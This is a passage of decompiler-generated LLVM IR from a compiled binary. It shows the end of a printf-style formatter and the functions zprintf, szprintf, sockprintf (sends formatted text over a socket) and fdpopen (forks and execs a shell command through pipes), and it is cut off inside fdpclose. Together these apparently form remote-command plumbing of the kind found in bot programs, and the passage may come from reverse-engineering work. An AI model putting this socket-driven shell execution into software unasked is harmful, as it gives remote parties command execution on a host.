  %stack_var_-28.0 = phi i32 [ %v3_10000df0, %dec_label_pc_10000dec ], [ %v2_10000dd0, %dec_label_pc_10000db4 ]
  %v1_10000e08 = inttoptr i32 %stack_var_-28.0 to i32*
  %v2_10000e08 = load i32, i32* %v1_10000e08, align 4
  %v7_10000e28 = call i32 @printi(i32 %tmp41, i32 %v2_10000e08, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000e34 = add i32 %v7_10000e28, %stack_var_-56.132
  br label %dec_label_pc_1000113c

dec_label_pc_10000e40:                            ; preds = %dec_label_pc_10000d8c
  %v2_10000e44 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000e4c = icmp eq i8 %v2_10000e44, 120
  br i1 %v3_10000e4c, label %dec_label_pc_10000e54, label %dec_label_pc_10000ef4

dec_label_pc_10000e54:                            ; preds = %dec_label_pc_10000e40
  %v2_10000e58 = load i8, i8* %tmp, align 1
  %tmp67 = icmp ugt i8 %v2_10000e58, 7
  br i1 %tmp67, label %dec_label_pc_10000ea0, label %dec_label_pc_10000e68

dec_label_pc_10000e68:                            ; preds = %dec_label_pc_10000e54
  %v3_10000e6c = load i32, i32* %v2_10000ce4, align 4
  %v2_10000e74 = load i8, i8* %tmp, align 1
  %v3_10000e74 = zext i8 %v2_10000e74 to i32
  %v1_10000e80 = mul nuw nsw i32 %v3_10000e74, 4
  %v2_10000e84 = add i32 %v1_10000e80, %v3_10000e6c
  %v1_10000e8c = add i8 %v2_10000e74, 1
  store i8 %v1_10000e8c, i8* %tmp, align 1
  br label %dec_label_pc_10000eb8

dec_label_pc_10000ea0:                            ; preds = %dec_label_pc_10000e54
  %v3_10000ea4 = load i32, i32* %v2_10000d1c, align 4
  %v1_10000eac = add i32 %v3_10000ea4, 4
  store i32 %v1_10000eac, i32* %v2_10000d1c, align 4
  br label %dec_label_pc_10000eb8

dec_label_pc_10000eb8:                            ; preds = %dec_label_pc_10000e68, %dec_label_pc_10000ea0
  %stack_var_-32.0 = phi i32 [ %v3_10000ea4, %dec_label_pc_10000ea0 ], [ %v2_10000e84, %dec_label_pc_10000e68 ]
  %v1_10000ebc = inttoptr i32 %stack_var_-32.0 to i32*
  %v2_10000ebc = load i32, i32* %v1_10000ebc, align 4
  %v7_10000edc = call i32 @printi(i32 %tmp41, i32 %v2_10000ebc, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000ee8 = add i32 %v7_10000edc, %stack_var_-56.132
  br label %dec_label_pc_1000113c

dec_label_pc_10000ef4:                            ; preds = %dec_label_pc_10000e40
  %v2_10000ef8 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000f00 = icmp eq i8 %v2_10000ef8, 88
  br i1 %v3_10000f00, label %dec_label_pc_10000f08, label %dec_label_pc_10000fa8

dec_label_pc_10000f08:                            ; preds = %dec_label_pc_10000ef4
  %v2_10000f0c = load i8, i8* %tmp, align 1
  %tmp68 = icmp ugt i8 %v2_10000f0c, 7
  br i1 %tmp68, label %dec_label_pc_10000f54, label %dec_label_pc_10000f1c

dec_label_pc_10000f1c:                            ; preds = %dec_label_pc_10000f08
  %v3_10000f20 = load i32, i32* %v2_10000ce4, align 4
  %v2_10000f28 = load i8, i8* %tmp, align 1
  %v3_10000f28 = zext i8 %v2_10000f28 to i32
  %v1_10000f34 = mul nuw nsw i32 %v3_10000f28, 4
  %v2_10000f38 = add i32 %v1_10000f34, %v3_10000f20
  %v1_10000f40 = add i8 %v2_10000f28, 1
  store i8 %v1_10000f40, i8* %tmp, align 1
  br label %dec_label_pc_10000f6c

dec_label_pc_10000f54:                            ; preds = %dec_label_pc_10000f08
  %v3_10000f58 = load i32, i32* %v2_10000d1c, align 4
  %v1_10000f60 = add i32 %v3_10000f58, 4
  store i32 %v1_10000f60, i32* %v2_10000d1c, align 4
  br label %dec_label_pc_10000f6c

dec_label_pc_10000f6c:                            ; preds = %dec_label_pc_10000f1c, %dec_label_pc_10000f54
  %stack_var_-36.0 = phi i32 [ %v3_10000f58, %dec_label_pc_10000f54 ], [ %v2_10000f38, %dec_label_pc_10000f1c ]
  %v1_10000f70 = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_10000f70 = load i32, i32* %v1_10000f70, align 4
  %v7_10000f90 = call i32 @printi(i32 %tmp41, i32 %v2_10000f70, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 65)
  %v2_10000f9c = add i32 %v7_10000f90, %stack_var_-56.132
  br label %dec_label_pc_1000113c

dec_label_pc_10000fa8:                            ; preds = %dec_label_pc_10000ef4
  %v2_10000fac = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000fb4 = icmp eq i8 %v2_10000fac, 117
  br i1 %v3_10000fb4, label %dec_label_pc_10000fbc, label %dec_label_pc_1000105c

dec_label_pc_10000fbc:                            ; preds = %dec_label_pc_10000fa8
  %v2_10000fc0 = load i8, i8* %tmp, align 1
  %tmp69 = icmp ugt i8 %v2_10000fc0, 7
  br i1 %tmp69, label %dec_label_pc_10001008, label %dec_label_pc_10000fd0

dec_label_pc_10000fd0:                            ; preds = %dec_label_pc_10000fbc
  %v3_10000fd4 = load i32, i32* %v2_10000ce4, align 4
  %v2_10000fdc = load i8, i8* %tmp, align 1
  %v3_10000fdc = zext i8 %v2_10000fdc to i32
  %v1_10000fe8 = mul nuw nsw i32 %v3_10000fdc, 4
  %v2_10000fec = add i32 %v1_10000fe8, %v3_10000fd4
  %v1_10000ff4 = add i8 %v2_10000fdc, 1
  store i8 %v1_10000ff4, i8* %tmp, align 1
  br label %dec_label_pc_10001020

dec_label_pc_10001008:                            ; preds = %dec_label_pc_10000fbc
  %v3_1000100c = load i32, i32* %v2_10000d1c, align 4
  %v1_10001014 = add i32 %v3_1000100c, 4
  store i32 %v1_10001014, i32* %v2_10000d1c, align 4
  br label %dec_label_pc_10001020

dec_label_pc_10001020:                            ; preds = %dec_label_pc_10000fd0, %dec_label_pc_10001008
  %stack_var_-40.0 = phi i32 [ %v3_1000100c, %dec_label_pc_10001008 ], [ %v2_10000fec, %dec_label_pc_10000fd0 ]
  %v1_10001024 = inttoptr i32 %stack_var_-40.0 to i32*
  %v2_10001024 = load i32, i32* %v1_10001024, align 4
  %v7_10001044 = call i32 @printi(i32 %tmp41, i32 %v2_10001024, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10001050 = add i32 %v7_10001044, %stack_var_-56.132
  br label %dec_label_pc_1000113c

dec_label_pc_1000105c:                            ; preds = %dec_label_pc_10000fa8
  %v2_10001060 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10001068 = icmp eq i8 %v2_10001060, 99
  br i1 %v3_10001068, label %dec_label_pc_10001070, label %dec_label_pc_1000113c

dec_label_pc_10001070:                            ; preds = %dec_label_pc_1000105c
  %v2_10001074 = load i8, i8* %tmp, align 1
  %tmp70 = icmp ugt i8 %v2_10001074, 7
  br i1 %tmp70, label %dec_label_pc_100010bc, label %dec_label_pc_10001084

dec_label_pc_10001084:                            ; preds = %dec_label_pc_10001070
  %v3_10001088 = load i32, i32* %v2_10000ce4, align 4
  %v2_10001090 = load i8, i8* %tmp, align 1
  %v3_10001090 = zext i8 %v2_10001090 to i32
  %v1_1000109c = mul nuw nsw i32 %v3_10001090, 4
  %v2_100010a0 = add i32 %v1_1000109c, %v3_10001088
  %v1_100010a8 = add i8 %v2_10001090, 1
  store i8 %v1_100010a8, i8* %tmp, align 1
  br label %dec_label_pc_100010d4

dec_label_pc_100010bc:                            ; preds = %dec_label_pc_10001070
  %v3_100010c0 = load i32, i32* %v2_10000d1c, align 4
  %v1_100010c8 = add i32 %v3_100010c0, 4
  store i32 %v1_100010c8, i32* %v2_10000d1c, align 4
  br label %dec_label_pc_100010d4

dec_label_pc_100010d4:                            ; preds = %dec_label_pc_10001084, %dec_label_pc_100010bc
  %stack_var_-44.0 = phi i32 [ %v3_100010c0, %dec_label_pc_100010bc ], [ %v2_100010a0, %dec_label_pc_10001084 ]
  %v1_100010d8 = inttoptr i32 %stack_var_-44.0 to i32*
  %v2_100010d8 = load i32, i32* %v1_100010d8, align 4
  %v1_100010dc = urem i32 %v2_100010d8, 256
  store i32 %v1_100010dc, i32* %stack_var_-88, align 4
  %v5_10001100 = call i32 @prints(i32 %tmp41, i8* %v4_10001100, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_1000110c = add i32 %v5_10001100, %stack_var_-56.132
  br label %dec_label_pc_1000113c

dec_label_pc_10001118:                            ; preds = %dec_label_pc_10000ba8, %dec_label_pc_10000bec
  %stack_var_-68.2 = phi i8* [ %v5_10000bc4, %dec_label_pc_10000bec ], [ %stack_var_-68.434, %dec_label_pc_10000ba8 ]
  %v2_1000111c = load i8, i8* %stack_var_-68.2, align 1
  %v3_1000111c = zext i8 %v2_1000111c to i32
  %v3_1000112c = call i32 @printchar(i32* %arg1, i32 %v3_1000111c)
  %v1_10001134 = add i32 %stack_var_-56.132, 1
  br label %dec_label_pc_1000113c

dec_label_pc_1000113c:                            ; preds = %dec_label_pc_1000105c, %dec_label_pc_100010d4, %dec_label_pc_10001020, %dec_label_pc_10000f6c, %dec_label_pc_10000eb8, %dec_label_pc_10000e04, %dec_label_pc_10000d60, %dec_label_pc_10001118
  %stack_var_-56.0 = phi i32 [ %v1_10001134, %dec_label_pc_10001118 ], [ %v2_10000d80, %dec_label_pc_10000d60 ], [ %v2_10000e34, %dec_label_pc_10000e04 ], [ %v2_10000ee8, %dec_label_pc_10000eb8 ], [ %v2_10000f9c, %dec_label_pc_10000f6c ], [ %v2_10001050, %dec_label_pc_10001020 ], [ %v2_1000110c, %dec_label_pc_100010d4 ], [ %stack_var_-56.132, %dec_label_pc_1000105c ]
  %stack_var_-68.3 = phi i8* [ %stack_var_-68.2, %dec_label_pc_10001118 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000d60 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000e04 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000eb8 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000f6c ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10001020 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_100010d4 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_1000105c ]
  %v4_1000113c = ptrtoint i8* %stack_var_-68.3 to i32
  %v1_10001140 = add i32 %v4_1000113c, 1
  %stack_var_-68.4 = inttoptr i32 %v1_10001140 to i8*
  %v2_1000114c = load i8, i8* %stack_var_-68.4, align 1
  %v3_10001154 = icmp eq i8 %v2_1000114c, 0
  br i1 %v3_10001154, label %dec_label_pc_1000115c, label %dec_label_pc_10000ba8

dec_label_pc_1000115c:                            ; preds = %dec_label_pc_10000bbc, %dec_label_pc_1000113c, %entry
  %stack_var_-56.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-56.132, %dec_label_pc_10000bbc ], [ %stack_var_-56.0, %dec_label_pc_1000113c ]
  %v3_10001160 = icmp eq i32* %arg1, null
  br i1 %v3_10001160, label %dec_label_pc_10001178, label %dec_label_pc_10001168

dec_label_pc_10001168:                            ; preds = %dec_label_pc_1000115c
  %v2_1000116c = load i32, i32* %arg1, align 4
  %v3_10001174 = inttoptr i32 %v2_1000116c to i8*
  store i8 0, i8* %v3_10001174, align 1
  br label %dec_label_pc_10001178

dec_label_pc_10001178:                            ; preds = %dec_label_pc_1000115c, %dec_label_pc_10001168
  ret i32 %stack_var_-56.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-68.4, { 1, 0 }
  uselistorder i8* %stack_var_-68.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-68.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10000c30, { 1, 0 }
  uselistorder i32 %stack_var_-52.0.ph, { 1, 0 }
  uselistorder i8* %v5_10000bc4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-56.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-68.4.in33, { 1, 0 }
  uselistorder i32* %v2_10000d1c, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_10001178, { 1, 0 }
  uselistorder label %dec_label_pc_1000115c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000113c, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_10001118, { 1, 0 }
  uselistorder label %dec_label_pc_100010d4, { 1, 0 }
  uselistorder label %dec_label_pc_10001020, { 1, 0 }
  uselistorder label %dec_label_pc_10000f6c, { 1, 0 }
  uselistorder label %dec_label_pc_10000eb8, { 1, 0 }
  uselistorder label %dec_label_pc_10000e04, { 1, 0 }
  uselistorder label %dec_label_pc_10000d60, { 1, 0 }
  uselistorder label %dec_label_pc_10000d30, { 1, 0 }
  uselistorder label %dec_label_pc_10000cb8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000ca4, { 1, 0 }
  uselistorder label %dec_label_pc_10000c2c, { 1, 0 }
  uselistorder label %dec_label_pc_10000ba8, { 1, 0 }
}

define i32 @zprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  store i32 1, i32* %stack_var_-136, align 4
  %v2_10001218 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268440100, i32* @lr, align 4
  %v4_10001220 = call i32 @print(i32* null, i32 %arg1, i32 %v2_10001218)
  ret i32 %v4_10001220

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-120, align 4
  store i32 2, i32* %stack_var_-136, align 4
  %v2_100012c8 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268440276, i32* @lr, align 4
  %v4_100012d0 = call i32 @print(i32* nonnull %stack_var_-120, i32 %arg2, i32 %v2_100012c8)
  ret i32 %v4_100012d0

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @sockprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 268440404, i32* @lr, align 4
  %v1_10001350 = call i32 @malloc(i32 2048)
  store i32 %v1_10001350, i32* %stack_var_-144, align 4
  store i32 268440436, i32* @lr, align 4
  %v3_10001370 = call i32 @__GI_memset(i32 %v1_10001350, i32 0, i32 2048)
  store i32 2, i32* %stack_var_-140, align 4
  %v2_100013a4 = ptrtoint i32* %stack_var_-140 to i32
  store i32 268440504, i32* @lr, align 4
  %v4_100013b4 = call i32 @print(i32* nonnull %stack_var_-144, i32 %arg2, i32 %v2_100013a4)
  store i32 %v1_10001350, i32* @r3, align 4
  %v0_100013bc = call i32 @__GI_strlen()
  %v2_100013cc = add i32 %v0_100013bc, %v1_10001350
  %v3_100013d4 = inttoptr i32 %v2_100013cc to i8*
  store i8 10, i8* %v3_100013d4, align 1
  store i32 %v1_10001350, i32* @r3, align 4
  %v0_100013dc = call i32 @__GI_strlen()
  store i32 268440568, i32* @lr, align 4
  %v4_100013f4 = call i32 @__libc_send(i32 %arg1, i32 %v1_10001350, i32 %v0_100013dc, i32 16384)
  store i32 268440584, i32* @lr, align 4
  %v1_10001404 = call i32 @free(i32 %v1_10001350)
  ret i32 %v4_100013f4

; uselistorder directives
  uselistorder i32 %v1_10001350, { 1, 4, 2, 0, 3, 5, 6 }
  uselistorder i32* %stack_var_-140, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-48 = alloca i32, align 4
  %v2_10001448 = load i8, i8* %arg2, align 1
  %v3_10001450 = icmp eq i8 %v2_10001448, 114
  br i1 %v3_10001450, label %dec_label_pc_1000146c, label %dec_label_pc_10001458

dec_label_pc_10001458:                            ; preds = %entry
  %v2_1000145c = load i8, i8* %arg2, align 1
  %v3_10001464 = icmp eq i8 %v2_1000145c, 119
  br i1 %v3_10001464, label %dec_label_pc_1000146c, label %dec_label_pc_10001484

dec_label_pc_1000146c:                            ; preds = %dec_label_pc_10001458, %entry
  %v1_10001470 = add i32 %tmp, 1
  %v2_10001470 = inttoptr i32 %v1_10001470 to i8*
  %v3_10001474 = load i8, i8* %v2_10001470, align 1
  %v3_1000147c = icmp eq i8 %v3_10001474, 0
  br i1 %v3_1000147c, label %dec_label_pc_10001490, label %dec_label_pc_10001484

dec_label_pc_10001484:                            ; preds = %dec_label_pc_10001458, %dec_label_pc_1000146c
  br label %dec_label_pc_100016b4

dec_label_pc_10001490:                            ; preds = %dec_label_pc_1000146c
  %v2_10001490 = ptrtoint i32* %stack_var_-48 to i32
  store i32 268440732, i32* @lr, align 4
  %v3_10001498 = call i32 @__GI_pipe(i32 %v2_10001490, i32 %v1_10001470)
  store i32 %v3_10001498, i32* @r3, align 4
  %tmp15 = icmp sgt i32 %v3_10001498, -1
  br i1 %tmp15, label %dec_label_pc_100014b4, label %dec_label_pc_100014a8

dec_label_pc_100014a8:                            ; preds = %dec_label_pc_10001490
  br label %dec_label_pc_100016b4

dec_label_pc_100014b4:                            ; preds = %dec_label_pc_10001490
  %v3_100014b8 = load i32, i32* @global_var_1001fdb0.22, align 4
  %v3_100014bc = icmp eq i32 %v3_100014b8, 0
  br i1 %v3_100014bc, label %dec_label_pc_100014c4, label %dec_label_pc_10001544

dec_label_pc_100014c4:                            ; preds = %dec_label_pc_100014b4
  store i32 268440776, i32* @lr, align 4
  %v0_100014c4 = call i32 @getdtablesize()
  %v2_100014d4 = icmp sgt i32 %v0_100014c4, 0
  br i1 %v2_100014d4, label %dec_label_pc_100014e8, label %dec_label_pc_100014dc

dec_label_pc_100014dc:                            ; preds = %dec_label_pc_100014c4
  br label %dec_label_pc_100016b4

dec_label_pc_100014e8:                            ; preds = %dec_label_pc_100014c4
  %v1_100014ec = mul i32 %v0_100014c4, 4
  store i32 268440824, i32* @lr, align 4
  %v1_100014f4 = call i32 @malloc(i32 %v1_100014ec)
  store i32 %v1_100014f4, i32* @global_var_1001fdb0.22, align 4
  %v3_1000150c = icmp eq i32 %v1_100014f4, 0
  br i1 %v3_1000150c, label %dec_label_pc_10001514, label %dec_label_pc_10001520

dec_label_pc_10001514:                            ; preds = %dec_label_pc_100014e8
  br label %dec_label_pc_100016b4

dec_label_pc_10001520:                            ; preds = %dec_label_pc_100014e8
  store i32 ptrtoint (i32* @global_var_10001544.23 to i32), i32* @lr, align 4
  %v3_10001540 = call i32 @__GI_memset(i32 %v1_100014f4, i32 0, i32 %v1_100014ec)
  store i32 %v3_10001540, i32* @r3, align 4
  br label %dec_label_pc_10001544

dec_label_pc_10001544:                            ; preds = %dec_label_pc_100014b4, %dec_label_pc_10001520
  store i32 268440904, i32* @lr, align 4
  %v0_10001544 = call i32 @__vfork()
  %v4_10001560 = icmp eq i32 %v0_10001544, -1
  br i1 %v4_10001560, label %dec_label_pc_10001578, label %dec_label_pc_10001568

dec_label_pc_10001568:                            ; preds = %dec_label_pc_10001544
  %v3_1000156c = icmp eq i32 %v0_10001544, 0
  br i1 %v3_1000156c, label %dec_label_pc_1000159c, label %dec_label_pc_1000164c

dec_label_pc_10001578:                            ; preds = %dec_label_pc_10001544
  %v3_10001578 = load i32, i32* %stack_var_-48, align 4
  store i32 268440964, i32* @lr, align 4
  %v1_10001580 = call i32 @__libc_close(i32 %v3_10001578)
  store i32 ptrtoint (i32* @global_var_10001590.24 to i32), i32* @lr, align 4
  %v1_1000158c = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_100016b4

dec_label_pc_1000159c:                            ; preds = %dec_label_pc_10001568
  %v3_100015a0 = load i8, i8* %arg2, align 1
  %v3_100015a8 = icmp eq i8 %v3_100015a0, 114
  br i1 %v3_100015a8, label %dec_label_pc_100015b0, label %dec_label_pc_100015e8

dec_label_pc_100015b0:                            ; preds = %dec_label_pc_1000159c
  %v3_100015b4 = icmp eq i32 %tmp3, 1
  br i1 %v3_100015b4, label %dec_label_pc_100015d8, label %dec_label_pc_100015bc

dec_label_pc_100015bc:                            ; preds = %dec_label_pc_100015b0
  store i32 268441036, i32* @lr, align 4
  %v4_100015c8 = call i32 @dup2(i32 %tmp3, i32 1, i32 %tmp)
  store i32 268441048, i32* @lr, align 4
  %v1_100015d4 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_100015d8

dec_label_pc_100015d8:                            ; preds = %dec_label_pc_100015b0, %dec_label_pc_100015bc
  %v3_100015d8 = load i32, i32* %stack_var_-48, align 4
  store i32 ptrtoint (i32* @global_var_100015e4.25 to i32), i32* @lr, align 4
  %v1_100015e0 = call i32 @__libc_close(i32 %v3_100015d8)
  br label %dec_label_pc_1000161c

dec_label_pc_100015e8:                            ; preds = %dec_label_pc_1000159c
  %v3_100015e8 = load i32, i32* %stack_var_-48, align 4
  %v3_100015ec = icmp eq i32 %v3_100015e8, 0
  br i1 %v3_100015ec, label %dec_label_pc_10001610, label %dec_label_pc_100015f4

dec_label_pc_100015f4:                            ; preds = %dec_label_pc_100015e8
  store i32 268441092, i32* @lr, align 4
  %v4_10001600 = call i32 @dup2(i32 %v3_100015e8, i32 0, i32 %tmp)
  %v3_10001604 = load i32, i32* %stack_var_-48, align 4
  store i32 268441104, i32* @lr, align 4
  %v1_1000160c = call i32 @__libc_close(i32 %v3_10001604)
  br label %dec_label_pc_10001610

dec_label_pc_10001610:                            ; preds = %dec_label_pc_100015e8, %dec_label_pc_100015f4
  store i32 268441116, i32* @lr, align 4
  %v1_10001618 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_1000161c

dec_label_pc_1000161c:                            ; preds = %dec_label_pc_100015d8, %dec_label_pc_10001610
  %v9_10001640 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1000de50.26 to i32), i32 ptrtoint ([3 x i8]* @global_var_1000de58.27 to i32), i32 ptrtoint ([3 x i8]* @global_var_1000de5c.28 to i32), i32 %arg1, i32 0, i32 268500992)
  %v1_10001648 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_1000164c

dec_label_pc_1000164c:                            ; preds = %dec_label_pc_10001568, %dec_label_pc_1000161c
  %v2_10001650 = load i8, i8* %arg2, align 1
  %v3_10001658 = icmp eq i8 %v2_10001650, 114
  %v3_10001660 = load i32, i32* %stack_var_-48, align 4
  br i1 %v3_10001658, label %dec_label_pc_10001660, label %dec_label_pc_10001678

dec_label_pc_10001660:                            ; preds = %dec_label_pc_1000164c
  store i32 ptrtoint (i32* @global_var_10001674.30 to i32), i32* @lr, align 4
  %v1_10001670 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_1000168c

dec_label_pc_10001678:                            ; preds = %dec_label_pc_1000164c
  store i32 268441228, i32* @lr, align 4
  %v1_10001688 = call i32 @__libc_close(i32 %v3_10001660)
  br label %dec_label_pc_1000168c

dec_label_pc_1000168c:                            ; preds = %dec_label_pc_10001660, %dec_label_pc_10001678
  %stack_var_-36.0 = phi i32 [ %v3_10001660, %dec_label_pc_10001660 ], [ %tmp3, %dec_label_pc_10001678 ]
  %v1_10001690 = mul i32 %stack_var_-36.0, 4
  %v3_1000169c = load i32, i32* @global_var_1001fdb0.22, align 4
  %v2_100016a0 = add i32 %v3_1000169c, %v1_10001690
  %v2_100016a8 = inttoptr i32 %v2_100016a0 to i32*
  store i32 %v0_10001544, i32* %v2_100016a8, align 4
  br label %dec_label_pc_100016b4

dec_label_pc_100016b4:                            ; preds = %dec_label_pc_10001578, %dec_label_pc_10001514, %dec_label_pc_100014dc, %dec_label_pc_100014a8, %dec_label_pc_10001484, %dec_label_pc_1000168c
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_10001514 ], [ -1, %dec_label_pc_10001578 ], [ %stack_var_-36.0, %dec_label_pc_1000168c ], [ -1, %dec_label_pc_100014dc ], [ -1, %dec_label_pc_100014a8 ], [ -1, %dec_label_pc_10001484 ]
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32 %v3_10001660, { 1, 0 }
  uselistorder i32 %v1_100014ec, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i8 114, { 1, 0, 2 }
  uselistorder i8* %arg2, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_100016b4, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_1000168c, { 1, 0 }
  uselistorder label %dec_label_pc_1000164c, { 1, 0 }
  uselistorder label %dec_label_pc_1000161c, { 1, 0 }
  uselistorder label %dec_label_pc_10001610, { 1, 0 }
  uselistorder label %dec_label_pc_100015d8, { 1, 0 }
  uselistorder label %dec_label_pc_10001544, { 1, 0 }
  uselistorder label %dec_label_pc_10001484, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-308 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %v3_100016f0 = load i32, i32* @global_var_1001fdb0.22, align 4
  %v3_100016f4 = icmp eq i32 %v3_100016f0, 0
  br i1 %v3_100016f4, label %dec_label_pc_10001720, label %dec_label_pc_100016fc

dec_label_pc_100016fc:                            ; preds = %entry
  %v1_10001700 = mul i32 %arg1, 4
  %v2_10001710 = add i32 %v3_100016f0, %v1_10001700
  %v1_10001714 = inttoptr i32 %v2_10001710 to i32*
  %v2_10001714 = load i32, i32* %v1_10001714, align 4
  %v3_10001718 = icmp eq i32 %v2_10001714, 0
  br i1 %v3_10001718, label %dec_label_pc_10001720, label %dec_label_pc_1000172c

dec_label_pc_10001720:                            ; preds = %dec_label_pc_100016fc, %entry
  br label %dec_label_pc_10001854

dec_label_pc_1000172c:                            ; preds = %dec_label_pc_100016fc
  store i32 268441396, i32* @lr, align 4
  %v1_10001730 = call i32 @__libc_close(i32 %arg1)
  %v2_10001734 = ptrtoint i32* %stack_var_-180 to i32
  store i32 268441408, i32* @lr, align 4
  %v1_1000173c = call i32 @sigemptyset(i32 %v2_10001734)
  store i32 %v2_10001734, i32* @r3, align 4
  store i32 268441424, i32* @lr, align 4
  %v2_1000174c = call i32 @__GI_sigaddset(i32 %v2_10001734, i32 2)
  store i32 %v2_10001734, i32* @r3, align 4
  store i32 268441440, i32* @lr, align 4
  %v2_1000175c = call i32 @__GI_sigaddset(i32 %v2_10001734, i32 3)
  store i32 %v2_10001734, i32* @r3, align 4
  store i32 268441456, i32* @lr, align 4
  %v2_1000176c = call i32 @__GI_sigaddset(i32 %v2_10001734, i32 1)
  %v2_10001774 = ptrtoint i32* %stack_var_-308 to i32
  store i32 268441480, i32* @lr, align 4
  %v3_10001784 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_10001734, i32 %v2_10001774)
  %v2_100017a4 = ptrtoint i32* %stack_var_-52 to i32
  br label %dec_label_pc_10001788

dec_label_pc_10001788:                            ; preds = %dec_label_pc_100017d0, %dec_label_pc_1000172c
  %v3_10001798 = load i32, i32* @global_var_1001fdb0.22, align 4
  %v2_1000179c = add i32 %v3_10001798, %v1_10001700
  %v1_100017a0 = inttoptr i32 %v2_1000179c to i32*
  %v2_100017a0 = load i32, i32* %v1_100017a0, align 4
  store i32 268441528, i32* @lr, align 4
  %v3_100017b4 = call i32 @__libc_waitpid(i32 %v2_100017a0, i32 %v2_100017a4, i32 0)
  %v4_100017c8 = icmp eq i32 %v3_100017b4, -1
  br i1 %v4_100017c8, label %dec_label_pc_100017d0, label %dec_label_pc_100017e4

dec_label_pc_100017d0:                            ; preds = %dec_label_pc_10001788
  %v0_100017d0 = call i32 @__errno_location()
  %v1_100017d8 = inttoptr i32 %v0_100017d0 to i32*
  %v2_100017d8 = load i32, i32* %v1_100017d8, align 4
  %v3_100017dc = icmp eq i32 %v2_100017d8, 4
  br i1 %v3_100017dc, label %dec_label_pc_10001788, label %dec_label_pc_100017e4

dec_label_pc_100017e4:                            ; preds = %dec_label_pc_10001788, %dec_label_pc_100017d0
  %v4_100017c8.lcssa = phi i1 [ false, %dec_label_pc_10001788 ], [ true, %dec_label_pc_100017d0 ]
  store i32 268441592, i32* @lr, align 4
  %v3_100017f4 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10001774, i32 0)
  %v1_100017fc = mul i32 %tmp5, 4
  %v3_10001808 = load i32, i32* @global_var_1001fdb0.22, align 4
